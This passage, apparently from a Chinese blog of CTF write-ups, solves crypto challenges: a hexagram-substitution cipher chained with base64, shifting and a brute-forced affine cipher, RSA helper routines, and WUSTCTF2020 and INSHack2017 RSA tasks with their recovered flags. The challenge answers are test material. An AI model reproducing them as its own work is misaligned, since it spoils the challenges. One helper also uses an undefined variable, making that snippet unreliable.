string">'姤'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> mingwen
    mingwen<span class="token operator">=</span>enc
    <span class="token keyword">for</span> each <span class="token keyword">in</span> keys<span class="token punctuation">:</span>
        mingwen<span class="token operator">=</span>mingwen<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>each<span class="token punctuation">,</span>mydisc<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这有了之后，后面的解题过程挺简单的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -- coding:UTF-8 --</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> string

enc <span class="token operator">=</span> <span class="token string">'升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有'</span>
mydisc <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span>
          <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span>
          <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span>
          <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span>
          <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span>
          <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span>
          <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span>
          <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span>
          <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span>
          <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>
keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'坤'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">,</span>
        <span class="token string">'困'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">,</span>
        <span class="token string">'家人'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">decrypt1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> mingwen
    mingwen <span class="token operator">=</span> enc
    <span class="token keyword">for</span> each <span class="token keyword">in</span> keys<span class="token punctuation">:</span>
        mingwen <span class="token operator">=</span> mingwen<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>each<span class="token punctuation">,</span> mydisc<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">)</span>
    mingwen <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span class="token punctuation">)</span>


decrypt1<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># n]h\\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP</span>
temp <span class="token operator">=</span> <span class="token string">"n]h\\]kka[[eiWW_R`bO]]`NMUWWIFXHUCP"</span>

<span class="token triple-quoted-string string">"""
def encrpyt5():
    enc = ''
    for i in flag:
        enc += chr((a * (ord(i) - 97) + b) % 26 + 97)
    return (enc)
def encrypt4():
    temp = ''
    offset = 5
    for i in range(len(enc)):
        temp += chr(ord(enc[i]) - offset - i)
    return (temp)
"""</span>


<span class="token keyword">def</span> <span class="token function">decrypto4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    enc <span class="token operator">=</span> <span class="token string">''</span>
    offset <span class="token operator">=</span> <span class="token number">5</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        enc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span>
    <span class="token keyword">return</span> enc


letter <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase


<span class="token keyword">def</span> <span class="token function">decrypto5</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 没给b的仿射密码，爆破b</span>
    aa <span class="token operator">=</span> <span class="token number">1</span>
    b <span class="token operator">=</span> <span class="token number">7</span>
    <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            aa <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        flag <span class="token operator">=</span> <span class="token string">''</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> letter<span class="token punctuation">[</span><span class="token punctuation">(</span>aa <span class="token operator">*</span> <span class="token punctuation">(</span>letter<span class="token punctuation">.</span>index<span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
            <span class="token keyword">return</span> flag

enc <span class="token operator">=</span> decrypto4<span class="token punctuation">(</span><span class="token punctuation">)</span>
decrypto5<span class="token punctuation">(</span>enc<span class="token punctuation">)</span>
<span class="token comment"># bjdcongratulationsongettingtheflag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><h3 id="各种参数的求取"><a href="#各种参数的求取" class="headerlink" title="各种参数的求取"></a>各种参数的求取</h3><h4 id="有e-d和n如何求出phi"><a href="#有e-d和n如何求出phi" class="headerlink" title="有e*d和n如何求出phi"></a>有<code>e*d</code>和<code>n</code>如何求出<code>phi</code></h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">K<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
phi<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>即</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">phi<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token operator">*</span>d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="有phi和n如何分解n"><a href="#有phi和n如何分解n" class="headerlink" title="有phi和n如何分解n"></a>有<code>phi</code>和<code>n</code>如何分解<code>n</code></h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">solve_p</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tmp1 <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># =p+q</span>
    tmp2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> P_n<span class="token punctuation">)</span> <span class="token comment"># =p-q</span>
    p <span class="token operator">=</span> <span class="token punctuation">(</span>tmp1 <span class="token operator">+</span> tmp2<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    q <span class="token operator">=</span> n <span class="token operator">//</span> p
    <span class="token keyword">return</span> p<span class="token punctuation">,</span> q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="中国剩余定理求通解"><a href="#中国剩余定理求通解" class="headerlink" title="中国剩余定理求通解"></a>中国剩余定理求通解</h4><p>这个就是有几个参数求X的那个，几个式子最后可以求得未知量。</p>
<pre class="line-numbers language-none"><code class="language-none">def merge(a1, n1, a2, n2):
    d &#x3D; gmpy2.gcd(n1, n2)
    c &#x3D; a2 - a1
    if c % d !&#x3D; 0:
        return 0
    c &#x3D; (c % n2 + n2) % n2
    c &#x3D; c &#x2F;&#x2F; d
    n1 &#x3D; n1 &#x2F;&#x2F; d
    n2 &#x3D; n2 &#x2F;&#x2F; d
    c *&#x3D; gmpy2.invert(n1, n2)
    c %&#x3D; n2
    c *&#x3D; n1 * d
    c +&#x3D; a1
    global n3
    global a3
    n3 &#x3D; n1 * n2 * d
    a3 &#x3D; (c % n3 + n3) % n3
    return 1


def exCRT(a, n):
    a1 &#x3D; a[0]
    n1 &#x3D; n[0]
    le &#x3D; len(a)
    for i in range(1, le):
        a2 &#x3D; a[i]
        n2 &#x3D; n[i]
        if not merge(a1, n1, a2, n2):
            return -1
        a1 &#x3D; a3
        n1 &#x3D; n3
    global mod
    mod &#x3D; n1
    return (a1 % n1 + n1) % n1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用时将a、n两个list带入即可。适合的情况为：</p>
<script type="math/tex; mode=display">
m ^ e ≡ c \quad mod \quad n</script><p>此时的话，欲求这个<code>m^e</code>，只需有几组对应的<code>c</code>和<code>n</code>的数据即可带入上方的<code>exCRT(a,n)</code>来求。</p>
<h4 id="小e值时的碰撞脚本"><a href="#小e值时的碰撞脚本" class="headerlink" title="小e值时的碰撞脚本"></a>小e值时的碰撞脚本</h4><blockquote>
<p>RSA不免遇到这种情况，当碰到小e的时候，下面的碰撞脚本也许能派上用场</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rune</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    k<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        x<span class="token operator">=</span>c<span class="token operator">+</span>k<span class="token operator">*</span>n
        <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        k<span class="token operator">=</span>k<span class="token operator">+</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其实这个脚本适用的也是下面的这个公式的情况，只不过对于这个e很小的这种情况是直接可以求出这个m，也就是明文信息的。</p>
<script type="math/tex; mode=display">
m ^ e ≡ c \quad mod \quad n</script><h3 id="使用rsa的方式"><a href="#使用rsa的方式" class="headerlink" title="使用rsa的方式"></a>使用rsa的方式</h3><h4 id="WUSTCTF2020-情书"><a href="#WUSTCTF2020-情书" class="headerlink" title="[WUSTCTF2020]情书"></a>[WUSTCTF2020]情书</h4><pre class="line-numbers language-none"><code class="language-none">Premise: Enumerate the alphabet by 0、1、2、.....  、25
Using the RSA system 
Encryption:0156 0821 1616 0041 0140 2130 1616 0793
Public Key:2537 and 13
Private Key:2537 and 937

flag: wctf2020&#123;Decryption&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个题目根据提示采用的是rsa的加密系统，这里翻译一下就是</p>
<pre class="line-numbers language-none"><code class="language-none">n&#x3D;2537
e&#x3D;13
d&#x3D;937<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>大概就像是这样进行解密的</p>
<p><img src="/2021/05/28/CTF/image-20210726202807984.png" alt></p>
<p>写出一个简单的脚本即可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">ciphertext <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token string">'0156 0821 1616 0041 0140 2130 1616 0793'</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
n<span class="token operator">=</span><span class="token number">2537</span>
d<span class="token operator">=</span><span class="token number">937</span>
plaintext <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> ciphertext<span class="token punctuation">:</span>
    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    plaintext <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span> <span class="token operator">+</span> m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>
<span class="token comment"># iloveyou</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="INSHack2017-rsa16m"><a href="#INSHack2017-rsa16m" class="headerlink" title="[INSHack2017]rsa16m"></a>[INSHack2017]rsa16m</h4><p><strong>TAG: n、c超级大，e正常</strong></p>
<p>这个题给出的两个参数超级大，怎么形容呢？我打开文件用了几十秒。。。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'rsa_16m.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">]</span>
    c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
